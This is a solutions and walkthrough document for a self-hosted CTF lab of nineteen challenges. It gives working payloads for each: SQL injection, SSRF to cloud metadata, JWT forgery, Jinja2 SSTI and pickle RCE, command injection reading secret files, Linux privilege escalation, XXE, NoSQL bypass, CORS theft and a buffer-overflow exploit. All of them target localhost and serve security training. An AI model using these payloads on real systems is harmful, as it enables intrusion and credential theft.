# Custom CTF Challenges — Solutions & Walkthroughs

This document contains solutions, exploitation payloads, and security remediation guidance for the custom CTF micro-challenges included in the suite.

---

## 🎯 Challenge 1: SQLi Vault & Auth Bypass (Port 9001)

### Objective
Exfiltrate the flag stored in `secret_vault` or bypass authentication to view the admin vault panel.

### Vulnerability Analysis
The search parameter `category` is directly concatenated into the SQL statement without parameterized queries:
```sql
SELECT id, name, category, price, description FROM products WHERE category = '{category}'
```

### Exploit Method A: UNION-Based Data Exfiltration
1. Inject a `UNION SELECT` to dump column 5 from `secret_vault`:
   ```sql
   ' UNION SELECT 1, secret_name, 'secret', 0, secret_data FROM secret_vault --
   ```
2. Result: The products grid will display:
   - Secret Identifier: `Master System Flag`
   - Secret Payload: `CTF{5ql_1nj3ct10n_m4st3r_byp4ss_2026}`

### Exploit Method B: Admin Login Auth Bypass
1. Navigate to `/login`.
2. Enter username: `admin' --` (with any password).
3. Result: Logs into the Admin Vault Panel and reveals all secrets.

---

## 🎯 Challenge 2: Cloud IMDS SSRF Exfiltrator (Port 9002)

### Objective
Leverage the unvalidated URL previewer to extract internal AWS IAM credentials and flag.

### Vulnerability Analysis
The backend executes `urllib.request.urlopen(target_url)` without restricting loopback (`127.0.0.1`, `localhost`) or cloud metadata IP ranges (`169.254.169.254`).

### Exploitation Steps
1. In the Webhook input field, submit:
   ```http
   http://127.0.0.1:8089/latest/meta-data/iam/security-credentials/
   ```
   Output: `s3-backup-admin-role`
2. Fetch the role credentials:
   ```http
   http://127.0.0.1:8089/latest/meta-data/iam/security-credentials/s3-backup-admin-role
   ```
3. Extracted Flag:
   ```json
   {
     "AccessKeyId": "ASIAVULNERABLEKEY9921",
     "Flag": "CTF{55rf_cl0ud_m3t4d4t4_3xf1ltr4t10n_9921}"
   }
   ```

---

## 🎯 Challenge 3: TokenVault JWT Forgery (Port 9003)

### Objective
Forge a JWT token to obtain `admin` privileges.

### Vulnerability Analysis
The application accepts tokens signed with `alg: "none"` without rejecting unsigned tokens, and uses a weak HMAC secret (`secret123`).

### Exploit Method A: `alg: "none"` Attack
1. Base64URL encode header: `{"typ":"JWT","alg":"none"}` -> `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0`
2. Base64URL encode payload: `{"sub":"admin_user","role":"admin"}` -> `eyJzdWIiOiJhZG1pbl91c2VyIiwicm9sZSI6ImFkbWluIn0`
3. Concatenate without signature (keeping trailing dot):
   ```
   eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbl91c2VyIiwicm9sZSI6ImFkbWluIn0.
   ```
4. Paste into the Custom Token submission form to unlock `CTF{jwt_n0n3_4lg_4nd_w34k_s3cr3t_f0rg3ry}`.

---

## 🎯 Challenge 4: SSTI Jinja2 Dynamic Templater (Port 9004)

### Objective
Exploit Jinja2 Server-Side Template Injection to read `/tmp/flag.txt`.

### Vulnerability Analysis
The backend executes `render_template_string(template_input)` on raw user input.

### Exploitation Steps
1. Verify SSTI with `{{ 7 * 7 }}` -> returns `49`.
2. Probe available classes and subclass hierarchy:
   ```jinja2
   {{ ''.__class__.__mro__[1].__subclasses__() }}
   ```
3. Execute OS command or file read:
   ```jinja2
   {{ cycler.__init__.__globals__.os.popen('cat /tmp/flag.txt').read() }}
   ```
4. Extracted Flag: `CTF{55t1_j1nj42_rce_pyth0n_s4ndb0x_3sc4p3}`

---

## 🎯 Challenge 5: NetProbe OS Command Injection (Port 9005)

### Objective
Chain operating system commands through the network diagnostic utility to read `/etc/secret_ctf_flag.conf`.

### Vulnerability Analysis
The application passes unescaped input to `subprocess.run(f"ping -c 2 {host}", shell=True)`.

### Exploitation Steps
1. Submit either of the following payloads:
   ```bash
   127.0.0.1 && cat /etc/secret_ctf_flag.conf
   ```
   or
   ```bash
   127.0.0.1 ; cat /root/flag.txt
   ```
2. Extracted Flag: `CTF{0s_c0mm4nd_1nj3ct10n_p1ng_pwn3d_4421}`

---

## 🎯 Challenge 6: Port Scanning & Network Service Recon Lab (Ports 2222, 8088, 2121, 2525, 5353)

### Objective
Practice Nmap port scanning, protocol enumeration, and banner grabbing to discover and extract 4 hidden flags across 5 network protocols.

### Port & Service Mapping
- **Port 2222**: SSH (OpenSSH) — `root` : `your_secure_password`
- **Port 8088**: HTTP (Nginx Web Server)
- **Port 2121**: FTP (vsftpd) — `ftpuser` : `your_secure_ftp_password`
- **Port 2525**: SMTP (Postfix Mail Service)
- **Port 5353**: DNS (BIND9 Forward Zone for `example.com`)

### Exploitation & Flag Retrieval Steps

1. **HTTP Flag (`POKHARA_HTTP_FLAG`)**:
   ```bash
   curl http://localhost:8088
   ```
   *Result*: `Flag for HTTP: POKHARA_HTTP_FLAG`

2. **FTP Flag (`POKHARA_FTP_FLAG`)**:
   ```bash
   ftp localhost 2121
   # User: ftpuser
   # Password: your_secure_ftp_password
   get flag.txt
   ```
   *Result*: `POKHARA_FTP_FLAG`

3. **SMTP Flag (`POKHARA_SMTP_FLAG`)**:
   ```bash
   nc localhost 2525
   ```
   *Result*: `220 mail.example.com ESMTP - Flag for SMTP: POKHARA_SMTP_FLAG`

4. **DNS TXT Record Flag (`POKHARA_DNS_FLAG`)**:
   ```bash
   dig @localhost -p 5353 flag.example.com TXT +short
   ```
   *Result*: `"Flag for DNS: POKHARA_DNS_FLAG"`

---

## 🎯 Challenge 7: Anonymous & Misconfigured Services Arena

### Objective
Enumerate anonymously accessible network services to extract internal system notes and databases.

### Exploitation Steps

1. **Samba Public Share (Port 445)**:
   ```bash
   smbclient -N //localhost/public -p 445
   # smb: \> ls
   # smb: \> get migration_backup_note.txt
   ```
   *Extracted Flag*: `CTF{smb_4n0nym0us_sh4r3_3xfl_8831}`

2. **Unauthenticated Redis Key Extraction (Port 6379)**:
   ```bash
   redis-cli -h localhost -p 6379 KEYS "*"
   redis-cli -h localhost -p 6379 GET flag
   ```
   *Extracted Flag*: `CTF{r3d15_un4uth_k3y_dumP_3xpl01t_992}`

3. **Anonymous FTP Access (Port 2122)**:
   ```bash
   ftp -p localhost 2122
   # Name: anonymous (Password: blank)
   # ftp> cd confidential
   # ftp> get annual_audit.txt
   ```
   *Extracted Flag*: `CTF{ftp_4n0n_d0wnl04d_pwn3d_1102}`

---

## 🎯 Challenge 8: Linux Privilege Escalation Arena (Port 2223)

### Objective
SSH in as low-privilege user `student` (`student123`) and escalate privileges to `root` to read `/root/root_flag.txt`.

### Step 1: Initial Shell Access
```bash
ssh -p 2223 student@localhost
# Password: student123
cat /home/student/user_flag.txt
# User Flag: CTF{us3r_fl4g_1n1t14l_4cc3ss_5510}
```

### Privilege Escalation Pathways:

#### Pathway A: SUID Binary (`/usr/bin/find`)
```bash
# Discover SUID binaries
find / -perm -4000 2>/dev/null
# Exploit find GTFOBins
find . -exec /bin/sh -p \; -quit
whoami  # root!
cat /root/root_flag.txt
```

#### Pathway B: Sudoers Misconfiguration (`python3`)
```bash
# Check sudo permissions
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'
whoami  # root!
```

#### Pathway C: Hijacking World-Writable Root Cron Job
```bash
# Inspect /etc/cron.d/backup_cron -> runs /opt/scripts/backup.sh as root
echo 'cp /root/root_flag.txt /tmp/root_flag && chmod 777 /tmp/root_flag' >> /opt/scripts/backup.sh
# Wait up to 60 seconds
cat /tmp/root_flag
```
*Root Flag*: `CTF{l1nux_pr1v3sc_gtf0b1ns_m4st3r_7721}`

---

## 🎯 Challenge 9: MediaVault File Upload & LFI Lab (Port 9006)

### Objective
Exploit Local File Inclusion to read system files and the secret flag.

### Exploitation Steps
1. Navigate to `http://localhost:9006`.
2. In the document input field, submit:
   ```http
   ?page=/flag.txt
   ```
   or path traversal:
   ```http
   ?page=../../../../flag.txt
   ```
3. *Extracted Flag*: `CTF{f1l3_upl04d_lf1_rce_byp4ss_9934}`

---

## 🎯 Challenge 10: Apex Global Bank IDOR & BOLA Lab (Port 9007)

### Objective
Tamper with account ID parameters to inspect the VIP Executive Vault.

### Exploitation Steps
1. Open Alice's account at `http://localhost:9007/account?id=101`.
2. Change the `id` parameter in the URL from `101` to `1`:
   ```http
   http://localhost:9007/account?id=1
   ```
3. Or fetch the API directly:
   ```http
   http://localhost:9007/api/account/1
   ```
4. *Extracted Flag*: `CTF{1d0r_b0l4_pr1v1l3g3_3sc4l4t10n_8821}`

---

## 🎯 Challenge 11: HashVault Credential Cracking Arena (Port 9008)

### Objective
Crack the administrator's MD5 password hash from the leaked database table.

### Exploitation Steps
1. Admin hash: `e295de8b20967db5be602b9ee77e6827`
2. Crack using Hashcat / John / CyberChef:
   ```bash
   echo "e295de8b20967db5be602b9ee77e6827" > hash.txt
   john --format=raw-md5 --wordlist=rockyou.txt hash.txt
   ```
   *Plaintext Recovered*: `dragon123`
3. Enter `dragon123` into the verification form on `http://localhost:9008`.
4. *Extracted Flag*: `CTF{h4sh_cr4ck1ng_m4st3r_j0hn_h4shc4t_8832}`

---

## 🎯 Challenge 12: XXE Invoicer XML Entity Lab (Port 9009)

### Objective
Exploit XML External Entity resolution in invoice processing to read `/flag.txt`.

### Vulnerability Analysis
The parser configures `lxml.etree.XMLParser(resolve_entities=True, load_dtd=True)` allowing arbitrary external DTD entity declarations.

### Exploitation Steps
1. Navigate to `http://localhost:9009`.
2. Submit the following XML payload:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE invoice [
     <!ENTITY xxe SYSTEM "file:///flag.txt">
   ]>
   <invoice>
       <customer>&xxe;</customer>
       <item>Security Audit</item>
       <amount>5000</amount>
   </invoice>
   ```
3. *Extracted Flag*: `CTF{xx3_3xt3rn4l_3nt1ty_xpl01t_9912}`

---

## 🎯 Challenge 13: NoSQL Gateway Injection Arena (Port 9010)

### Objective
Bypass authentication with MongoDB query operators and extract the secret admin token using regex.

### Exploitation Steps
1. **Phase 1 (Auth Bypass):**
   ```bash
   curl -X POST http://localhost:9010/api/login \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$ne": "wrong"}}'
   ```
2. **Phase 2 (Blind Regex Extraction):**
   ```bash
   curl -X POST http://localhost:9010/api/user/lookup \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "secret_token": {"$regex": "^CTF{n05ql.*"}}'
   ```
3. Submit full exact regex `^CTF{n05ql_1nj3ct10n_m0ng0_0p3r4t0r_pwnd_8812}$` to reveal token.
4. *Extracted Flag*: `CTF{n05ql_1nj3ct10n_m0ng0_0p3r4t0r_pwnd_8812}`

---

## 🎯 Challenge 14: PickleVault Insecure Deserialization (Port 9011)

### Objective
Execute arbitrary commands to read `/flag.txt` by crafting a malicious Python `pickle` payload in the `user_pref` cookie.

### Exploitation Steps
1. Generate the exploit payload with Python:
   ```python
   import pickle, base64, os
   
   class Exploit:
       def __reduce__(self):
           # Read flag and return in object state
           return (os.popen, ("cat /flag.txt",))
   
   payload = base64.b64encode(pickle.dumps(Exploit())).decode()
   print("Cookie:", payload)
   ```
2. Paste the payload into the "Direct Cookie Injector" form on `http://localhost:9011`.
3. *Extracted Flag*: `CTF{p1ckl3_d353r14l1z4t10n_rc3_pwn4g3_9941}`

---

## 🎯 Challenge 15: Race Condition Bank & Store (Port 9012)

### Objective
Exploit a TOCTOU concurrency race condition in voucher redemption to amass $1,000+ and purchase the VIP CTF Flag.

### Exploitation Steps
1. Navigate to `http://localhost:9012`.
2. Click **"Fire 25 Concurrent Requests! 💥"** in the Concurrency Turbo Cannon.
   *Or with Python:*
   ```python
   import requests, concurrent.futures
   
   s = requests.Session()
   s.get('http://localhost:9012/') # init session cookie
   
   def redeem():
       return s.post('http://localhost:9012/api/redeem', json={'code': 'DISCOUNT2026'}).json()
   
   with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
       futures = [executor.submit(redeem) for _ in range(25)]
   ```
3. Balance will increase to $1,050+.
4. Click **"Buy $1,000"** on the VIP CTF Master Flag.
5. *Extracted Flag*: `CTF{r4c3_c0nd1t10n_t0ct0u_mult1thr34d_pwn3d_7719}`

---

## 🎯 Challenge 16: GraphQL Vault & Introspection (Port 9013)

### Objective
Uncover hidden administrative queries via GraphQL schema introspection and execute the unlock mutation.

### Exploitation Steps
1. Introspect schema:
   ```graphql
   {
     __schema {
       types {
         name
         fields {
           name
           description
         }
       }
     }
   }
   ```
2. Query the hidden `vaultInspection` field:
   ```graphql
   {
     vaultInspection(accessCode: "ADMIN_DEBUG") {
       vaultId
       securityLevel
       masterPasscode
       confidentialFlag
     }
   }
   ```
3. Execute the `unlockVaultFlag` mutation with passcode `nexus_shadow_protocol_2026`:
   ```graphql
   mutation {
     unlockVaultFlag(masterPasscode: "nexus_shadow_protocol_2026") {
       status
       flag
     }
   }
   ```
4. *Extracted Flag*: `CTF{gr4phql_1ntr0sp3ct10n_s3cr3t_sch3m4_8819}`

---

## 🎯 Challenge 17: Aura Identity CORS & CSRF Portal (Port 9014)

### Objective
Exploit permissive CORS origin reflection with credentials from an external attacker origin.

### Exploitation Steps
1. Navigate to `http://localhost:9014/attacker-sandbox`.
2. Execute the cross-origin exploit:
   ```javascript
   fetch('http://localhost:9014/api/profile', {
       method: 'GET',
       credentials: 'include'
   })
   .then(r => r.json())
   .then(data => console.log('Stolen Flag:', data.user.confidential_flag));
   ```
3. *Extracted Flag*: `CTF{c0rs_m1sc0nf1g_cr3d3nt14l_th3ft_4419}`

---

## 🎯 Challenge 18: PWN Arena: 64-Bit Stack Buffer Overflow (Port 9015)

### Objective
Overwrite the saved instruction pointer (RIP) on the stack using an unbounded `gets()` buffer overflow to jump to `print_flag()`.

### Vulnerability Analysis
- Buffer size: 64 bytes (`char buffer[64]`)
- Saved RBP: 8 bytes
- Total padding to RIP: 72 bytes
- Target function: `print_flag()` (address printed upon connection, e.g. `0x401196`)

### Exploitation Steps
1. Connect via Python `pwntools` or raw socket:
   ```python
   from pwn import *
   
   p = remote('localhost', 9015)
   p.recvuntil(b'print_flag() function is located at: ')
   flag_addr = int(p.recvline().strip(), 16)
   
   payload = b'A' * 72 + p64(flag_addr)
   p.sendlineafter(b'Enter your feedback or payload: ', payload)
   print(p.recvall().decode())
   ```
2. *Extracted Flag*: `CTF{buff3r_0v3rfl0w_r3t2w1n_pwn_m4st3r_64b1t_8829}`

---

## 🎯 Challenge 19: Aether Ops WebSocket Hijacking (Port 9016)

### Objective
Intercept confidential system audit broadcasts by connecting to `/ws` across origins without validation.

### Exploitation Steps
1. Navigate to `http://localhost:9016`.
2. Click **"Start Intercept Stream 🛰️"** in the Attacker CSWSH Workbench.
   *Or in the browser console:*
   ```javascript
   const ws = new WebSocket('ws://localhost:9016/ws');
   ws.onmessage = (e) => console.log('INTERCEPTED:', e.data);
   ```
3. Wait 5 seconds for the automated system security audit broadcast.
4. *Extracted Flag*: `CTF{csw5h_w3bs0ck3t_h1j4ck_0r1g1n_pwn_5512}`



